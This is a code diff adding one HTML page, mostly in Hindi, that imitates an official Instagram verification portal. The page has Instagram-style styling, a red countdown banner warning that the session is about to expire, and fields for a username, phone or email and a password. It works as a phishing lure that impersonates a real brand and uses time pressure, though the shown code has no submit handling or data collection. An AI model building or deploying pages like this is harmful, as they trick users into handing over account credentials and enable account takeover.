@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Verification Portal - Official</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .timer-header {
+            background: #ed4956;
+            color: white;
+            width: 100%;
+            text-align: center;
+            padding: 12px 0;
+            font-weight: bold;
+            font-size: 14px;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+
+        .main-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            width: 90%;
+            max-width: 350px;
+            margin-top: 30px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border-radius: 3px;
+        }
+
+        h2 {
+            font-size: 18px;
+            color: #262626;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 9px;
+            margin-bottom: 10px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+        }
+
+        button {
+            width: 100%;
+            background: #0095f6;
+            color: white;
+            border: none;
+            padding: 7px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background: #1877f2;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="timer-header">
+        सत्र समाप्त होने का समय: <span id="timer">05:00</span>
+    </div>
+
+    <div class="main-box">
+        <h2>Instagram Verification</h2>
+        <p style="font-size: 13px; color: #8e8e8e; text-align: center;">अपनी पहचान सत्यापित करने के लिए कृपया विवरण भरें।</p>
+        
+        <input type="text" placeholder="यूजरनेम, फोन या ईमेल" required>
+        <input type="password" placeholder="नया पासवर्ड" required>
+        
+        <button type="submit">सत्यापित करें (Verify)</button>
+    </div>
+
+    <script>
+        // एक छोटा सा टाइमर फंक्शन
+        let time = 300;
+        const timerElement = document.getElementById('timer');
+
+        setInterval(() => {
+            let minutes = Math.floor(time / 60);
+            let seconds = time % 60;
+            seconds = seconds < 10 ? '0' + seconds : seconds;
+            timerElement.innerHTML = `${minutes}:${seconds}`;
+            if(time > 0) time--;
+        }, 1000);
+    </script>
+
+</body>
+</html>
